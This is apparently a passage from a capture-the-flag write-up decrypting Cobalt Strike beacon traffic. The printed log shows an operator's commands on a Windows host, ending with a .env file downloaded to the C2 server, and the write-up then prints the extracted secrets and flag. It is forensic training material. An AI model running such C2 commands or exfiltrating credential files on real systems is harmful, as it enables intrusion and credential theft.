http://192.168.176.129/zOMGAPT?tmp=AOBCGFMECPGCHBFAHMHOPEIFACMALIPGFEKNMJHGJEAAHGDJGGKKCEKGKNDCBFJLOMOLDEGACCGJOHCIBLMADKPIBNCBPGILCEMAJNEHOIHGEKMNHDKGIMEDHICKFFOPGDMMOJKAKCBOEHBHPPGJAKNGJIBCHKOIKGFJHHBKBAANIIDHFCNHMGPJCLFICDAHHMPNBGGNGLGAIEOEPLIONFEOJLDPDLBJJAFAKCGCOJGMFOLPBABIPPFCNKAAEHBE
Length raw data: 48
HMAC signature invalid

Packet number: 55
HTTP response (for request 52 )
Length raw data: 48
Timestamp: 1731545696 20241114-005456
Data size: 8
Command: 27 COMMAND_GETUID
 Arguments length: 0

Packet number: 55
HTTP request
http://192.168.176.129/zOMGAPT?tmp=AOBCGFMECPGCHBFAHMHOPEIFACMALIPGFEKNMJHGJEAAHGDJGGKKCEKGKNDCBFJLOMOLDEGACCGJOHCIBLMADKPIBNCBPGILCEMAJNEHOIHGEKMNHDKGIMEDHICKFFOPGDMMOJKAKCBOEHBHPPGJAKNGJIBCHKOIKGFJHHBKBAANIIDHFCNHMGPJCLFICDAHHMPNBGGNGLGAIEOEPLIONFEOJLDPDLBJJAFAKCGCOJGMFOLPBABIPPFCNKAAEHBE
Length raw data: 48
HMAC signature invalid

Packet number: 62
HTTP request POST
http://192.168.176.129/BUYTHEAPTDETECTORNOWNzA0MDU4OTI0
Length raw data: 68
Counter: 2
Callback: 16 CALLBACK_TOKEN_GETUID
b'DESKTOP-N8QRFSQ\\zoznoor23'

Packet number: 78
HTTP response (for request 74 )
Length raw data: 48
Timestamp: 1731545698 20241114-005458
Data size: 8
Command: 39 COMMAND_PWD
 Arguments length: 0

Packet number: 78
HTTP request
http://192.168.176.129/zOMGAPT?tmp=AOBCGFMECPGCHBFAHMHOPEIFACMALIPGFEKNMJHGJEAAHGDJGGKKCEKGKNDCBFJLOMOLDEGACCGJOHCIBLMADKPIBNCBPGILCEMAJNEHOIHGEKMNHDKGIMEDHICKFFOPGDMMOJKAKCBOEHBHPPGJAKNGJIBCHKOIKGFJHHBKBAANIIDHFCNHMGPJCLFICDAHHMPNBGGNGLGAIEOEPLIONFEOJLDPDLBJJAFAKCGCOJGMFOLPBABIPPFCNKAAEHBE
Length raw data: 48
HMAC signature invalid

Packet number: 85
HTTP request POST
http://192.168.176.129/BUYTHEAPTDETECTORNOWNzA0MDU4OTI0
Length raw data: 68
Counter: 3
Callback: 19 CALLBACK_PWD
b'C:\\Users\\zoznoor23\\Desktop'

Packet number: 100
HTTP response (for request 97 )
Length raw data: 48
Timestamp: 1731545701 20241114-005501
Data size: 19
Command: 53 COMMAND_LS
 Arguments length: 11
 b'\xff\xff\xff\xfe\x00\x00\x00\x03.\\*'
 MD5: 4a2685ea905daff3380145bc124d7b2b

Packet number: 100
HTTP request
http://192.168.176.129/zOMGAPT?tmp=AOBCGFMECPGCHBFAHMHOPEIFACMALIPGFEKNMJHGJEAAHGDJGGKKCEKGKNDCBFJLOMOLDEGACCGJOHCIBLMADKPIBNCBPGILCEMAJNEHOIHGEKMNHDKGIMEDHICKFFOPGDMMOJKAKCBOEHBHPPGJAKNGJIBCHKOIKGFJHHBKBAANIIDHFCNHMGPJCLFICDAHHMPNBGGNGLGAIEOEPLIONFEOJLDPDLBJJAFAKCGCOJGMFOLPBABIPPFCNKAAEHBE
Length raw data: 48
HMAC signature invalid

Packet number: 107
HTTP request POST
http://192.168.176.129/BUYTHEAPTDETECTORNOWNzA0MDU4OTI0
Length raw data: 260
Counter: 4
Callback: 22 CALLBACK_PENDING
b'\xff\xff\xff\xfe'
----------------------------------------------------------------------------------------------------
C:\Users\zoznoor23\Desktop\*
D       0       11/13/2024 16:53:26     .
D       0       11/13/2024 16:53:26     ..
F       282     08/10/2024 16:10:16     desktop.ini
D       0       11/13/2024 15:50:54     Leucothea_app.v1
F       354816  11/13/2024 16:51:00     Maintenance.exe

----------------------------------------------------------------------------------------------------
Extra packet data: b'\x00\x00'

Packet number: 155
HTTP response (for request 151 )
Length raw data: 64
Timestamp: 1731545709 20241114-005509
Data size: 24
Command: 5 COMMAND_CD
 Arguments length: 16
 b'Leucothea_app.v1'
 MD5: 364fe75ef2892cbc769d6ad9f6fb79d9

Packet number: 155
HTTP request
http://192.168.176.129/zOMGAPT?tmp=AOBCGFMECPGCHBFAHMHOPEIFACMALIPGFEKNMJHGJEAAHGDJGGKKCEKGKNDCBFJLOMOLDEGACCGJOHCIBLMADKPIBNCBPGILCEMAJNEHOIHGEKMNHDKGIMEDHICKFFOPGDMMOJKAKCBOEHBHPPGJAKNGJIBCHKOIKGFJHHBKBAANIIDHFCNHMGPJCLFICDAHHMPNBGGNGLGAIEOEPLIONFEOJLDPDLBJJAFAKCGCOJGMFOLPBABIPPFCNKAAEHBE
Length raw data: 64
HMAC signature invalid

Packet number: 165
HTTP response (for request 162 )
Length raw data: 48
Timestamp: 1731545711 20241114-005511
Data size: 19
Command: 53 COMMAND_LS
 Arguments length: 11
 b'\xff\xff\xff\xfe\x00\x00\x00\x03.\\*'
 MD5: 4a2685ea905daff3380145bc124d7b2b

Packet number: 165
HTTP request
http://192.168.176.129/zOMGAPT?tmp=AOBCGFMECPGCHBFAHMHOPEIFACMALIPGFEKNMJHGJEAAHGDJGGKKCEKGKNDCBFJLOMOLDEGACCGJOHCIBLMADKPIBNCBPGILCEMAJNEHOIHGEKMNHDKGIMEDHICKFFOPGDMMOJKAKCBOEHBHPPGJAKNGJIBCHKOIKGFJHHBKBAANIIDHFCNHMGPJCLFICDAHHMPNBGGNGLGAIEOEPLIONFEOJLDPDLBJJAFAKCGCOJGMFOLPBABIPPFCNKAAEHBE
Length raw data: 48
HMAC signature invalid

Packet number: 172
HTTP request POST
http://192.168.176.129/BUYTHEAPTDETECTORNOWNzA0MDU4OTI0
Length raw data: 436
Counter: 5
Callback: 22 CALLBACK_PENDING
b'\xff\xff\xff\xfe'
----------------------------------------------------------------------------------------------------
C:\Users\zoznoor23\Desktop\Leucothea_app.v1\*
D       0       11/13/2024 15:50:54     .
D       0       11/13/2024 15:50:54     ..
F       324     11/13/2024 15:56:23     .env
F       1840    11/13/2024 15:51:49     app.json
F       9200    11/13/2024 15:51:35     app.py
D       0       11/13/2024 15:50:43     assets
F       1242    11/13/2024 15:51:08     build.sh
F       322     11/13/2024 15:51:22     Dockerfile
F       134     11/13/2024 15:52:00     requirements.txt
D       0       11/13/2024 15:49:25     Templates

----------------------------------------------------------------------------------------------------
Extra packet data: b'\rC\x01'

Packet number: 220
HTTP response (for request 216 )
Length raw data: 48
Timestamp: 1731545719 20241114-005519
Data size: 12
Command: 11 COMMAND_DOWNLOAD
 Arguments length: 4
 b'.env'
 MD5: f579cccc964135c7d644c7b2d3b0d3ec

Packet number: 220
HTTP request
http://192.168.176.129/zOMGAPT?tmp=AOBCGFMECPGCHBFAHMHOPEIFACMALIPGFEKNMJHGJEAAHGDJGGKKCEKGKNDCBFJLOMOLDEGACCGJOHCIBLMADKPIBNCBPGILCEMAJNEHOIHGEKMNHDKGIMEDHICKFFOPGDMMOJKAKCBOEHBHPPGJAKNGJIBCHKOIKGFJHHBKBAANIIDHFCNHMGPJCLFICDAHHMPNBGGNGLGAIEOEPLIONFEOJLDPDLBJJAFAKCGCOJGMFOLPBABIPPFCNKAAEHBE
Length raw data: 48
HMAC signature invalid

Packet number: 227
HTTP request POST
http://192.168.176.129/BUYTHEAPTDETECTORNOWNzA0MDU4OTI0
Length raw data: 524
Counter: 6
Callback: 2 CALLBACK_FILE
 parameter1: 0
 length: 324
 filenameDownload: C:\Users\zoznoor23\Desktop\Leucothea_app.v1\.env

Counter: 7
Callback: 8 CALLBACK_FILE_WRITE
 Length: 324
 MD5: f1e503e1eaee73f61c4d09a3926fa7cd

Counter: 8
Callback: 9 CALLBACK_FILE_CLOSE
b'\x00\x00\x00\x00'

Commands summary:
 4 COMMAND_SLEEP: 1
 5 COMMAND_CD: 1
 11 COMMAND_DOWNLOAD: 1
 27 COMMAND_GETUID: 1
 39 COMMAND_PWD: 1
 53 COMMAND_LS: 2

Callbacks summary:
 2 CALLBACK_FILE: 1
 8 CALLBACK_FILE_WRITE: 1
 9 CALLBACK_FILE_CLOSE: 1
 16 CALLBACK_TOKEN_GETUID: 1
 19 CALLBACK_PWD: 1
 22 CALLBACK_PENDING: 2
```

Notice how the -e flag is used when using the tool. This is to extract payload content from the C2 traffic.

![apt7](/assets/posts/pwnsecctf2024/apt7.png)

One of the payload has the secret with other credentials.

```
username=zoznoor23
password=lol

API_KEY=d4f8e7a9-2c3b-41b8-bf22-a59f7e6b09c1
GOOGLE_API_KEY=AIzaSyA-EXAMPLE-KEY12345

DATABASE_URL=postgresql://root:root@localhost:5432/leucothea 
DB_HOST=localhost
DB_PORT=5432
DB_USER=root
DB_PASSWORD=root
DB_NAME=leucothea 

secret=D3cRypt1n6_c0b4l7_57r1k3_7r4ff1c_15_1n54n3
```
